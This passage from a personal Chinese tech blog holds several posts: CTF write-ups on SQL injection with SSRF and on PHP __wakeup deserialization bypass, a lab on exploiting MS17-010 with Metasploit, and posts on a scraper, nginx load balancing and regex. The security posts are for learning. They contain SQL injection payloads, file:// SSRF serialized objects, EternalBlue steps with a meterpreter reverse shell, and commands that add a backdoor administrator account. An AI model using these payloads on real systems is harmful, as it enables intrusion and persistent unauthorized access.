<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
<p>爆出一大堆列名。直接读取data的内容</p>
<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
<p>发现内容是注册时信息保存为序列化内容</p>
<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
<p>到这里就不知道怎么办了。。。</p>
<h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" alt></p>
<p>源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;
    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // 处理<span class="hljs-title">url</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-variable">$ch</span> = curl_init();

    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
    &#125;
    curl_close(<span class="hljs-variable">$ch</span>);

    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;
    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);
&#125;
&#125;</code></pre>
<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
<pre><code class="hljs ada">?no=-<span class="hljs-number">2</span>%<span class="hljs-number">20</span>union/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;%<span class="hljs-number">20</span>#</code></pre>

<p>查看源码，解base64。</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>unserailize</tag>
      </tags>
  </entry>
  <entry>
    <title>jdtest</title>
    <url>/2020/07/18/jdtest/</url>
    <content><![CDATA[<h1 id="爬取京东商品图片的小测试"><a href="#爬取京东商品图片的小测试" class="headerlink" title="爬取京东商品图片的小测试"></a>爬取京东商品图片的小测试</h1><span id="more"></span>
<p>访问的页面<br><img src="/2020/07/18/jdtest/jd.png" alt="1"><br>图片链接的位置<br><img src="/2020/07/18/jdtest/link.png" alt="2"></p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/7/16 14:54</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : jd.py</span>

<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> os

<span class="hljs-built_in">dir</span> = <span class="hljs-string">&quot;jdtp&quot;</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-built_in">dir</span>):
    os.mkdir(<span class="hljs-built_in">dir</span>)

baseurl = <span class="hljs-string">&quot;https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu&quot;</span>

head = &#123;
        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot;</span>
    &#125;
response = requests.get(url=baseurl, headers = head)
<span class="hljs-comment">#print(response.text)</span>
html = response.text

findlinks = <span class="hljs-string">&#x27;&lt;img width=&quot;220&quot; height=&quot;220&quot; data-img=&quot;\d&quot; src=&quot;(.*?)&quot;.*?&gt;&#x27;</span>
<span class="hljs-comment">#&lt;img width=&quot;220&quot; height=&quot;220&quot; data-img=&quot;1&quot; src=&quot;//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg&quot; data-lazy-img=&quot;done&quot; source-data-lazy-img=&quot;&quot;&gt;</span>
urls = re.findall(findlinks, html)

<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
    time.sleep(<span class="hljs-number">1</span>)
    file_name = url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]
    res = requests.get(<span class="hljs-string">&quot;http:&quot;</span>+url,headers = head)
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;/&#x27;</span>+file_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:
        f.write(res.content)</code></pre>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>网安作业1</title>
    <url>/2020/09/27/homework/</url>
    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><span id="more"></span>

<h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
<p>Kali IP 10.1.1.1  255.0.0.0  win7 IP　10.1.1.2  255.0.0.0</p>
<p>测试两台主机之间的通信情况</p>
<p><img src="https://i.loli.net/2020/11/30/BAUIrJYP4ahwb3Z.png" alt="1.png"></p>
<p><img src="https://i.loli.net/2020/11/30/skpyjBZi8T94hbO.png" alt="2.png"> </p>
<p>使用msf前需要开启postgresql服务 </p>
<p>开启服务：service postgresql start </p>
<p>查看服务状态：service postgresql status</p>
<p>开到绿色字体的active即为开启了</p>
<p>初始化数据库：msfdb init </p>
<p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" alt="3.png"> </p>
<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><h3 id="1-首先判断目标主机是否打开445端口"><a href="#1-首先判断目标主机是否打开445端口" class="headerlink" title="(1).首先判断目标主机是否打开445端口"></a>(1).首先判断目标主机是否打开445端口</h3><p>使用nmap+ip 扫描</p>
<h3 id="2-确认目标主机打开445端口后直接使用msf进行攻击"><a href="#2-确认目标主机打开445端口后直接使用msf进行攻击" class="headerlink" title="(2) .确认目标主机打开445端口后直接使用msf进行攻击"></a>(2) .确认目标主机打开445端口后直接使用msf进行攻击</h3><p>输入msfconsole　启动msf</p>
<p>输入search　MS17-010</p>
<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
<p>运行</p>
<pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploitwindows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue</code></pre>

<p>输入 show options  查看需要配置哪些信息</p>
<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
<p>RPORT 为目标端口号(445)</p>
<p>LHOST 为监听主机IP(10.1.1.1)</p>
<p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" alt="5.png"> </p>
<p> <img src="https://i.loli.net/2020/11/30/bq6YZiehzAtxEcu.png" alt="6.png"></p>
<h3 id="3-配置成功后设置tcp连接"><a href="#3-配置成功后设置tcp连接" class="headerlink" title="(3). 配置成功后设置tcp连接"></a>(3). 配置成功后设置tcp连接</h3><p>输入命令</p>
<pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp</code></pre>



<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit/run </p>
<p>成功获取shell</p>
<p><img src="https://i.loli.net/2020/11/30/Cyj8Kt6ldzMbGh9.png" alt="7.png"></p>
<p>查看ip地址验证是否为目标主机。</p>
<p> <img src="https://i.loli.net/2020/11/30/OTBhu37xXEv2Pb8.png" alt="8.png"></p>
<h3 id="5-设立后门，在目标主机中创建一个用户"><a href="#5-设立后门，在目标主机中创建一个用户" class="headerlink" title="(5)设立后门，在目标主机中创建一个用户"></a>(5)设立后门，在目标主机中创建一个用户</h3><p>创建一个用户</p>
<pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre>

<p>Username:test </p>
<p>password:abc123.com</p>
<p>将该用户加入管理员组，使其拥有管理员权限</p>
<pre><code class="hljs stata"><span class="hljs-keyword">net</span> localgroup administrtors <span class="hljs-keyword">test</span> /add</code></pre>

<p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" alt="10.png"></p>
<p>目标主机上用户创建成功</p>
<p><img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" alt="11.png"></p>
<p>  <strong>实验结束</strong></p>
]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx</title>
    <url>/2022/07/24/nginx/</url>
    <content><![CDATA[<h1 id="Nginx负载均衡配置"><a href="#Nginx负载均衡配置" class="headerlink" title="Nginx负载均衡配置"></a>Nginx负载均衡配置</h1><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220724181955601.png" alt="image-20220724181955601"></p>
<h2 id="将java项目打包并启动"><a href="#将java项目打包并启动" class="headerlink" title="将java项目打包并启动"></a>将java项目打包并启动</h2><p>这里为了有效果，打包了两份，当访问接口时，控制台打印不同的日志</p>
<pre><code class="hljs sh">java -jar .\api-2.0.1-8081.jar --server.port=8081
java -jar .\api-2.0.1-8082.jar --server.port=8082</code></pre>

<h2 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h2><pre><code class="hljs awk"><span class="hljs-comment">#user  nobody;</span>
worker_processes <span class="hljs-number">4</span>;

<span class="hljs-comment">#pid        logs/nginx.pid;</span>
events &#123;
     worker_connections <span class="hljs-number">40960</span>;
&#125;

http &#123;
    include       mime.types;
    default_type  application/octet-stream;
    <span class="hljs-comment">#access_log  logs/access.log  main;</span>
     sendfile  on;
    <span class="hljs-comment">#tcp_nopush     on;</span>

    <span class="hljs-comment">#keepalive_timeout  0;</span>
     keepalive_timeout <span class="hljs-number">65</span>;

    <span class="hljs-comment">#gzip  on;</span>

    upstream myservice &#123;
        server <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>;
	    server <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8083</span>;
	    <span class="hljs-comment"># server 127.0.0.1:8847;</span>
    &#125;

    server &#123;
    listen       <span class="hljs-number">80</span>;
    server_name  localhost;

    location / &#123;
        proxy_pass http:<span class="hljs-regexp">//my</span>service;
        &#125;
    &#125;

	<span class="hljs-comment">#include vhosts.conf;</span>
    map <span class="hljs-variable">$time_iso8601</span> <span class="hljs-variable">$logdate</span> &#123;
        <span class="hljs-string">&#x27;~^(?&lt;ymd&gt;\\d&#123;4&#125;-\\d&#123;2&#125;-\\d&#123;2&#125;)&#x27;</span> <span class="hljs-variable">$ymd</span>;
        default                       <span class="hljs-string">&#x27;date-not-found&#x27;</span>;
    &#125;
	include vhosts/*.conf;

	 client_max_body_size  <span class="hljs-number">50</span>m;
     client_body_buffer_size <span class="hljs-number">60</span>k;
     client_body_timeout <span class="hljs-number">60</span>;
     client_header_buffer_size <span class="hljs-number">64</span>k;
     client_header_timeout <span class="hljs-number">60</span>;
     error_page <span class="hljs-number">400</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">400</span>.html;
     error_page <span class="hljs-number">403</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">403</span>.html;
     error_page <span class="hljs-number">404</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">404</span>.html;
     error_page <span class="hljs-number">500</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">500</span>.html;
     error_page <span class="hljs-number">501</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">501</span>.html;
     error_page <span class="hljs-number">502</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">502</span>.html;
     error_page <span class="hljs-number">503</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">503</span>.html;
     error_page <span class="hljs-number">504</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">504</span>.html;
     error_page <span class="hljs-number">505</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">505</span>.html;
     error_page <span class="hljs-number">506</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">506</span>.html;
     error_page <span class="hljs-number">507</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">507</span>.html;
     error_page <span class="hljs-number">509</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">509</span>.html;
     error_page <span class="hljs-number">510</span> <span class="hljs-regexp">/error/</span><span class="hljs-number">510</span>.html;
     
     keepalive_requests <span class="hljs-number">100</span>;
     large_client_header_buffers <span class="hljs-number">4</span> <span class="hljs-number">64</span>k;
     reset_timedout_connection on;
     send_timeout <span class="hljs-number">60</span>;
     sendfile_max_chunk <span class="hljs-number">512</span>k;
     server_names_hash_bucket_size <span class="hljs-number">256</span>;
&#125;
     worker_rlimit_nofile <span class="hljs-number">100000</span>;
</code></pre>

<p>主要配置内容为</p>
<pre><code class="hljs nginx"><span class="hljs-attribute">upstream</span> myservice &#123;
    <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8081</span>;
 <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8083</span>;
 <span class="hljs-comment"># server 127.0.0.1:8847;</span>
&#125;

<span class="hljs-section">server</span> &#123;
<span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>;
<span class="hljs-attribute">server_name</span>  localhost;

<span class="hljs-attribute">location</span> / &#123;
    <span class="hljs-attribute">proxy_pass</span> http://myservice;
    &#125;
&#125;
</code></pre>

<p>启动nginx即可</p>
<p>**当启动ngin没反应时，多半是配置文件有问题，可以直接拷贝正确的配置后修改</p>
<h1 id="Nginx负载均衡策略"><a href="#Nginx负载均衡策略" class="headerlink" title="Nginx负载均衡策略"></a>Nginx负载均衡策略</h1><blockquote>
<p>前端/用户所有对Tomcat(应用服务器)的请求都是通过Nginx转发的:<br>用户请求发送到nginx，nginx转发的对应的服务器，一个集群中有多个服务器节点，那么Nginx怎么确定转发到哪个服务器节点呢?<br>Nginx提供了四种负载均衡策略，同时也支持配置第三方的负载均衡策略。</p>
</blockquote>
<h2 id="轮询"><a href="#轮询" class="headerlink" title="轮询"></a>轮询</h2><blockquote>
<p>根据用户的请求交替的发送到每个服务器节点，是nginx默认的负载均衡策略</p>
</blockquote>
<pre><code class="hljs properties"><span class="hljs-attr">upstream</span> <span class="hljs-string">myservice &#123;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8081 max_fails=3 fail_timeout 20s fail_time=100s;</span>
<span class="hljs-comment">    # 如果在20s内失败了三次 则让该服务器停止100s</span>
 <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8082;</span>
 <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8083;</span>
 <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8084 backup; </span>
<span class="hljs-comment"> # 备用机</span>
 <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8085 down;</span>
<span class="hljs-comment"> # 该服务器永远都用不上</span>
<span class="hljs-attr">&#125;</span></code></pre>

<ul>
<li>max_fails设置在fail_timeout参数设置的时间内最大失败次数，如果在这个时间内，所有针对该服务器的请求都失败了，那么认为该服务器会被认为是停机了</li>
<li>fail_timeout 与max_fails结合使用</li>
<li>fail_time服务器会被认为停机的时间长度,默认为10s</li>
<li>backup标记该服务器为备用服务器,当主服务器停止时，请求会被发送到它这里</li>
<li>down标记服务器永久停机了</li>
</ul>
<h2 id="权重"><a href="#权重" class="headerlink" title="权重"></a>权重</h2><pre><code class="hljs properties"> <span class="hljs-attr">upstream</span> <span class="hljs-string">myservice &#123;</span>
       <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8081 weight=2;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8082;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8083;</span>
<span class="hljs-attr">&#125;</span></code></pre>

<ul>
<li>权重方式，在轮询策略的基础上指定轮询的几率(根据服务器性能和资源情况设置对应权重比)</li>
<li>weight参数用于指定轮询几率,weight的默认值为1，weight的数值与访问比率成正比</li>
<li>权重越高分配到需要处理的请求越多</li>
<li>此策略比较适合服务器的硬件配置差别比较大的情况</li>
</ul>
<h2 id="ip-hash"><a href="#ip-hash" class="headerlink" title="ip_hash"></a>ip_hash</h2><p>指定负载均衡器按照基于客户端IP的分配方式，这个方法确保了相同的客户端的请求一直发送到相同的服务器，以保证session会话。这样每个访客都固定访问一个后端服务器，可以解决session不能跨服务器的问题。</p>
<pre><code class="hljs properties"> <span class="hljs-attr">upstream</span> <span class="hljs-string">myservice &#123;</span>
 	    <span class="hljs-meta">ip_hash;</span>  <span class="hljs-string"># 保证每个用户固定访问同一个后端服务器</span>
       <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8081 weight=2;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8082;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8083;</span>
<span class="hljs-attr">&#125;</span></code></pre>



<h2 id="least-conn"><a href="#least-conn" class="headerlink" title="least _conn"></a>least _conn</h2><p>把请求转发给连接数较少的后端服务器。轮询算法是把请求平均的转发给各个后端，使它们的负载大致相同;但是，有些请求占用的时间很长，会导致其所在的后端负载较高。这种情况下，least _conn这种方式就可以达到更好的负载均衡效果。</p>
<pre><code class="hljs properties"> <span class="hljs-attr">upstream</span> <span class="hljs-string">myservice &#123;</span>
 	    <span class="hljs-attr">least</span> <span class="hljs-string">_conn;  # 把请求转发到连接数较少的fu</span>
       <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8081 weight=2;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8082;</span>
    <span class="hljs-attr">server</span> <span class="hljs-string">127.0.0.1:8083;</span>
<span class="hljs-attr">&#125;</span></code></pre>

]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>反序列化</p>
<span id="more"></span>
<p>PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 </p>
<p>而<strong>wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用</strong>wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
<p>serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
<p>unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
<p>举例说明</p>
<pre><code>&lt;?php
class Student&#123;
public $full_name = &apos;zhangsan&apos;;
public $score = 150;
public $grades = array();

function __wakeup() &#123;
echo &quot;__wakeup is invoked&quot;;
&#125;
&#125;

$s = new Student();
var_dump(serialize($s));
?&gt;</code></pre><hr>
<pre><code>O:7:&quot;Student&quot;:3:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;</code></pre><p>各个符号的含义<br><strong>变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容}</strong></p>
<p>其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br>wakeup()漏洞就是与整个属性个数值有关。<strong>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</strong></p>
<p>当我们将上述的序列化的字符串中的对象属性个数修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}</p>
<p>最后执行运行的代码如下:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span>&#123;
<span class="hljs-keyword">public</span> <span class="hljs-variable">$full_name</span> = <span class="hljs-string">&#x27;zhangsan&#x27;</span>;
<span class="hljs-keyword">public</span> <span class="hljs-variable">$score</span> = <span class="hljs-number">150</span>;
<span class="hljs-keyword">public</span> <span class="hljs-variable">$grades</span> = <span class="hljs-keyword">array</span>();

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup is invoked&quot;</span>;
&#125;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
var_dump(<span class="hljs-keyword">$this</span>);
&#125;
&#125;

<span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Student();
<span class="hljs-variable">$stu</span> = unserialize(<span class="hljs-string">&#x27;O:7:&quot;Student&quot;:5:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;&#x27;</span>);
<span class="hljs-meta">?&gt;</span></code></pre>


<h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p>题目</p>
<pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;
<span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);
&#125;
?code=</code></pre>

<hr>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;  <span class="hljs-comment">//定义一个名为xctf的类</span>
<span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<span class="hljs-comment">//定义一个公有的类属性$flag，值为111</span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span>
<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);
&#125;
&#125;
<span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> xctf();   <span class="hljs-comment">//使用new运算符来实例化该类（xctf）的对象为test</span>
<span class="hljs-keyword">echo</span>(serialize(<span class="hljs-variable">$test</span>));   <span class="hljs-comment">//输出被序列化的对象（test）</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>输出结果</p>
<pre><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></pre><p>我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：</p>
<pre><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></pre><p>访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/2020/11/01/preg/</url>
    <content><![CDATA[<p>在一些代码审计的题目当中经常会出现使用正则表达过滤字符串的情况，所以有必要系统的学习一下！</p>
<span id="more"></span>

<h1 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h1><p><a href="https://www.runoob.com/regexp/regexp-example.html">详情见这</a></p>
<p>菜鸡教程中介绍的很详细。</p>
<h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符<strong>\</strong> 放在它们前面。下表列出了正则表达式中的特殊字符：</p>
<table>
<thead>
<tr>
<th align="left">特别字符</th>
<th align="right">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$</td>
<td align="right">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。</td>
</tr>
<tr>
<td align="left">( )</td>
<td align="right">标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td>
</tr>
<tr>
<td align="left">*</td>
<td align="right">匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \*。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="right">匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \+。</td>
</tr>
<tr>
<td align="left">.</td>
<td align="right">匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 \. 。</td>
</tr>
<tr>
<td align="left">[</td>
<td align="right">标记一个中括号表达式的开始。要匹配 [，请使用\[。</td>
</tr>
<tr>
<td align="left">?</td>
